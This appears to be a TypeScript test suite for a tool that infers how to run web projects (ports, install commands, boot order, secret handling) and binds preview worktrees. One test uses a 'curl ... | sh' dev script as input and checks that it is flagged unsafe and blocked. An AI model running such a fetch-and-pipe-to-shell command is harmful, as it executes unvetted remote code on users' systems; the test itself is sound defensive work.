import test from 'node:test';
import assert from 'node:assert/strict';
import { classifyCommand, inferRuntime, startupOrder } from './runtime-inference';
import { profileRepository } from './profiler';
import { parseArtifact, validateBundle } from './artifacts';
import { artifactFixture } from './artifact-fixtures';
import { createBuildRepository } from './repository';
import type { SqlExecutor } from '../db';
import type { BuildSession } from './contracts';

function infer(sources: Record<string, string>, revision = 'a'.repeat(40)) {
  const files = Object.entries(sources).map(([path, content]) => ({ path, bytes: Buffer.from(content), executable: false }));
  const before = files.map(f => f.bytes.toString('hex'));
  const result = inferRuntime({ files, source_revision: revision, worktree_id: 'task-one', expected_content_sha256: profileRepository(files).content_sha256 });
  assert.deepEqual(files.map(f => f.bytes.toString('hex')), before);
  assert.deepEqual(parseArtifact('runtime.yaml', result.yaml), result.runtime);
  return result;
}

test('Next and Vite infer commands and ports without claiming a health endpoint', () => {
  for (const [framework, port] of [['next', 3000], ['vite', 5173]] as const) {
    const { runtime } = infer({ 'package.json': JSON.stringify({ dependencies: { [framework]: 'fixture' }, scripts: { dev: `${framework} dev`, build: `${framework} build`, start: `${framework} start` } }), 'package-lock.json': '{}' });
    assert.equal(runtime.services[0].port, port);
    assert.deepEqual(runtime.services[0].install, ['npm', 'ci']);
    assert.equal(runtime.services[0].health_check, null);
    assert.equal(runtime.source_revision, 'a'.repeat(40)); assert.equal(runtime.worktree_id, 'task-one');
    assert.equal(runtime.inference?.launch_authorized, false);
  }
});

test('Express/Postgres migration is ordered after install and resource, before API', () => {
  const { runtime } = infer({ 'package.json': JSON.stringify({ dependencies: { express: 'fixture', pg: 'fixture' }, scripts: { dev: 'node server.js', migrate: 'node migrate.js' } }),
    'server.js': "app.listen(4000); app.get('/health', handler); const url = process.env.DATABASE_URL;", '.env.example': 'DATABASE_URL=not-a-real-value\nSESSION_SECRET=fixture-never-output\nPAYMENT_API_KEY=fixture-private-value\nPORT=4000' });
  const service = runtime.services[0]; const meta = runtime.inference!;
  assert.equal(service.port, 4000); assert.equal(service.health_check?.type, 'http');
  assert.equal(runtime.resources[0].type, 'postgres');
  assert.ok(meta.boot_order.indexOf(service.id + '-migration') > meta.boot_order.indexOf(service.id + '-postgres'));
  assert.ok(meta.boot_order.indexOf(service.id) > meta.boot_order.indexOf(service.id + '-migration'));
  assert.equal(meta.environment.find(e => e.key === 'SESSION_SECRET')?.kind, 'GENERATED_PREVIEW');
  assert.equal(meta.environment.find(e => e.key === 'PAYMENT_API_KEY')?.kind, 'USER_PROVIDED_SECRET');
  assert.equal(meta.environment.find(e => e.key === 'DATABASE_URL')?.kind, 'INTERNAL_SERVICE_URL');
  assert.equal(meta.environment.find(e => e.key === 'PORT')?.required, false);
  assert.ok(!JSON.stringify(runtime).includes('fixture-private-value'));
  assert.ok(!JSON.stringify(runtime).includes('fixture-never-output'));
});

test('React/FastAPI monorepo retains separate processes, source evidence and uncertainty', () => {
  const result = infer({ 'web/package.json': '{"dependencies":{"vite":"fixture"},"scripts":{"dev":"vite"}}',
    'api/requirements.txt': 'fastapi\nuvicorn\npsycopg\n', 'api/main.py': 'from fastapi import FastAPI\napp = FastAPI()\n@app.get("/health")\ndef health(): return {}\n',
    'api/.env.example': 'DATABASE_URL=fixture-value', 'web/.env.example': 'API_URL=fixture-internal-url' });
  assert.equal(result.runtime.services.length, 2);
  const api = result.runtime.services.find(s => s.framework === 'FastAPI')!;
  assert.deepEqual(api.dev, ['python', '-m', 'uvicorn', 'main:app', '--host', '0.0.0.0', '--port', '8000']);
  assert.equal(api.health_check?.type, 'http');
  assert.ok(result.runtime.inference?.blockers.some(b => b.includes('Cross-service')));
  const reordered = infer(Object.fromEntries(Object.entries({ 'package.json': '{"dependencies":{"next":"fixture"},"scripts":{"dev":"next dev"}}', 'package-lock.json': '{}' }).reverse()));
  const normal = infer({ 'package.json': '{"dependencies":{"next":"fixture"},"scripts":{"dev":"next dev"}}', 'package-lock.json': '{}' });
  assert.deepEqual(reordered, normal);
});

test('unsafe scripts, unknown frameworks, invalid graphs and stale source cannot authorize launch', () => {
  const result = infer({ 'package.json': '{"scripts":{"dev":"curl https://example.invalid/setup | sh"}}' });
  assert.equal(result.runtime.services[0].dev, null);
  assert.ok(result.runtime.inference?.commands[0].classifications.includes('UNSAFE'));
  assert.ok(!result.yaml.includes('example.invalid'));
  assert.deepEqual(classifyCommand('node app.js', true), ['REQUIRES_SANDBOX', 'REQUIRES_SECRET']);
  assert.deepEqual(classifyCommand('', false, true), ['SAFE_METADATA']);
  assert.throws(() => startupOrder([{ id: 'a', dependencies: ['b'] }, { id: 'b', dependencies: ['a'] }]), /cycle/);
  assert.throws(() => startupOrder([{ id: 'a', dependencies: ['missing'] }]), /references/);
  assert.throws(() => infer({ 'package.json': '{}' }, 'latest'), /revision/);
  assert.throws(() => inferRuntime({ files: [{ path: 'package.json', bytes: Buffer.from('{}'), executable: false }], source_revision: 'a'.repeat(40), worktree_id: 'task', expected_content_sha256: '0'.repeat(64) }), /fingerprint/);
});

test('workspace installs and missing manifests remain explicit review blockers', () => {
  const result = infer({ 'pnpm-lock.yaml': 'lockfileVersion: 9', 'apps/web/package.json': '{"dependencies":{"next":"fixture"},"scripts":{"dev":"next dev -p 3010"}}' });
  assert.equal(result.runtime.services[0].install, null); assert.equal(result.runtime.services[0].port, 3010);
  assert.ok(result.runtime.inference?.blockers.some(b => b.includes('workspace install')));
  assert.throws(() => infer({ 'README.md': 'Unknown application' }), /No supported/);
});

test('runtime revision and worktree must agree with preview artifacts', () => {
  const bundle = artifactFixture('frontend-only'); bundle['runtime.yaml'].source_revision = 'b'.repeat(40);
  assert.throws(() => validateBundle(bundle), /runtime.yaml.source_revision/);
  bundle['runtime.yaml'].source_revision = bundle['preview.yaml'].source_revision;
  bundle['runtime.yaml'].worktree_id = 'wrong-worktree';
  assert.throws(() => validateBundle(bundle), /runtime.yaml.worktree_id/);
});

test('preview worktree binding is scoped, versioned, transactional and invalidates old preview', async () => {
  const scope = { owner_user_id: 'user', organization_id: 'org', project_id: 'project', session_id: 'session' };
  let row = { ...scope, state: 'BUILDING', version: 0, preview_id: 'old' } as BuildSession;
  let worktreeScope = { ...scope }; let failEvent = false;
  const exec: SqlExecutor = async <T>(sql: string, values?: unknown[] | Record<string, unknown>): Promise<T> => {
    const p = values as unknown[];
    if (sql.startsWith('SELECT *')) return [structuredClone(row)] as T;
    if (sql.startsWith('SELECT resource_id')) return [{ ...worktreeScope, kind: 'worktree' }] as T;
    if (sql.startsWith('UPDATE')) { row = { ...row, active_worktree_id: p[0] as string, active_preview_revision: p[1] as string, preview_id: null, version: row.version + 1 }; return {} as T; }
    if (sql.startsWith('INSERT INTO build_session_events')) { if (failEvent) throw new Error('audit failed'); return {} as T; }
    throw new Error('Unexpected SQL');
  };
  const repository = createBuildRepository({ authorize: async () => ({ organizationId: 'org' }), transaction: async work => {
    const before = structuredClone(row); try { return await work(exec); } catch (error) { row = before; throw error; }
  } });
  await assert.rejects(repository.bindPreviewWorktree('other', scope, 0, 'task', 'a'.repeat(40)), /denied/);
  worktreeScope = { ...scope, session_id: 'other' };
  await assert.rejects(repository.bindPreviewWorktree('user', scope, 0, 'task', 'a'.repeat(40)), /denied/);
  worktreeScope = scope;
  await repository.bindPreviewWorktree('user', scope, 0, 'task', 'a'.repeat(40));
  assert.equal(row.preview_id, null); assert.equal(row.active_worktree_id, 'task');
  assert.equal(row.active_preview_revision, 'a'.repeat(40));
  await assert.rejects(repository.bindPreviewWorktree('user', scope, 0, 'task', 'a'.repeat(40)), /Stale/);
  failEvent = true;
  await assert.rejects(repository.bindPreviewWorktree('user', scope, 1, 'new-task', 'b'.repeat(40)), /audit/);
  assert.equal(row.active_worktree_id, 'task'); assert.equal(row.version, 1);
});
